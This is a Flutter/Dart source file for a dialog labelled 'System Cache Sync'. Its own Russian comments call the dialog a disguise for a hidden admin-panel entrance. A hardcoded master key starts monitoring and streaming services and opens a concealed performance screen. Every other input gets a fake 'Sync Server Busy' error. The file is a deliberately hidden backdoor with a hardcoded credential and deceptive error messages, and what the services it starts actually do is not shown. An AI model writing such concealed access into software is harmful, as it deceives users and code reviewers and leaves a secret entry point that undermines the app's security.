import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:provider/provider.dart';
import '../services/perf_tracker_service.dart';
import '../services/rust_bridge_service.dart';
import '../screens/ui_performance_screen.dart';

/// 📊 SystemCacheSync - Cache Synchronization Dialog
///
/// МАСКИРОВКА: Выглядит как системный диалог синхронизации кэша
/// РЕАЛЬНОСТЬ: Скрытый вход в админ-панель
class SystemCacheSync {
  static void show(BuildContext context) {
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => _CacheSyncDialog(),
    );
  }
}

class _CacheSyncDialog extends StatefulWidget {
  @override
  State<_CacheSyncDialog> createState() => _CacheSyncDialogState();
}

class _CacheSyncDialogState extends State<_CacheSyncDialog> {
  final _keyController = TextEditingController();
  bool _obscureText = true;
  String _status = '';
  int _attemptCount = 0;
  bool _isSyncing = false;

  static const String _masterKey = 'REDACTED_PASSWORD';
  static const int maxAttempts = 3;

  @override
  void dispose() {
    _keyController.dispose();
    super.dispose();
  }

  Future<void> _syncCache() async {
    final key = _keyController.text;

    if (key.isEmpty) {
      setState(() => _status = 'Cache key required');
      return;
    }

    setState(() => _isSyncing = true);

    final perfService = Provider.of<PerfTrackerService>(context, listen: false);

    // 🔐 STEALTH MODE: Фейковая ошибка для всех
    if (key == _masterKey) {
      // Успешная активация
      await perfService.startMonitoring(key);
      RustBridgeService.instance.startStreaming();

      if (mounted) {
        Navigator.of(context).pop();
        Navigator.of(context).push(
          MaterialPageRoute(builder: (_) => const UIPerformanceScreen()),
        );
      }
    } else {
      // Фейковая ошибка синхронизации
      setState(() {
        _status = 'Sync Server Busy';
        _isSyncing = false;
      });
      
      _attemptCount++;
      
      if (_attemptCount >= maxAttempts) {
        await Future.delayed(const Duration(milliseconds: 500));
        if (mounted) Navigator.of(context).pop();
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return AlertDialog(
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(12),
        side: BorderSide(color: Colors.grey[700]!, width: 1),
      ),
      title: Row(
        children: [
          Icon(Icons.sync, color: Colors.grey[400], size: 22),
          const SizedBox(width: 12),
          Text(
            'System Cache Sync',
            style: TextStyle(
              color: Colors.grey[300],
              fontWeight: FontWeight.bold,
              fontSize: 16,
            ),
          ),
        ],
      ),
      content: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          Text(
            'Enter cache synchronization key',
            style: TextStyle(color: Colors.grey[600], fontSize: 11),
            textAlign: TextAlign.center,
          ),
          const SizedBox(height: 16),
          TextField(
            controller: _keyController,
            obscureText: _obscureText,
            autofocus: true,
            style: TextStyle(fontSize: 14, color: Colors.grey[200]),
            decoration: InputDecoration(
              hintText: 'Cache Key',
              hintStyle: TextStyle(color: Colors.grey[600]),
              prefixIcon: Icon(Icons.lock, color: Colors.grey[600]),
              suffixIcon: IconButton(
                icon: Icon(
                  _obscureText ? Icons.visibility_off : Icons.visibility,
                  color: Colors.grey[600],
                ),
                onPressed: () => setState(() => _obscureText = !_obscureText),
              ),
              border: OutlineInputBorder(
                borderRadius: BorderRadius.circular(8),
                borderSide: BorderSide(color: Colors.grey[700]!),
              ),
              contentPadding: const EdgeInsets.all(12),
            ),
            onSubmitted: (_) => _syncCache(),
          ),
          if (_status.isNotEmpty) ...[
            const SizedBox(height: 12),
            Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(
                color: Colors.orange.withOpacity(0.1),
                borderRadius: BorderRadius.circular(4),
              ),
              child: Row(
                children: [
                  Icon(Icons.info, size: 14, color: Colors.orange),
                  const SizedBox(width: 8),
                  Expanded(
                    child: Text(
                      _status,
                      style: TextStyle(color: Colors.orange, fontSize: 10),
                    ),
                  ),
                ],
              ),
            ),
          ],
        ],
      ),
      actions: [
        TextButton(
          onPressed: _isSyncing ? null : () => Navigator.of(context).pop(),
          child: Text('Cancel', style: TextStyle(color: Colors.grey[600])),
        ),
        ElevatedButton(
          onPressed: _isSyncing ? null : _syncCache,
          style: ElevatedButton.styleFrom(
            backgroundColor: Colors.grey[800],
            foregroundColor: Colors.grey[300],
            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10),
          ),
          child: _isSyncing
              ? const SizedBox(width: 16, height: 16, child: CircularProgressIndicator(strokeWidth: 2))
              : const Text('Sync'),
        ),
      ],
    );
  }
}
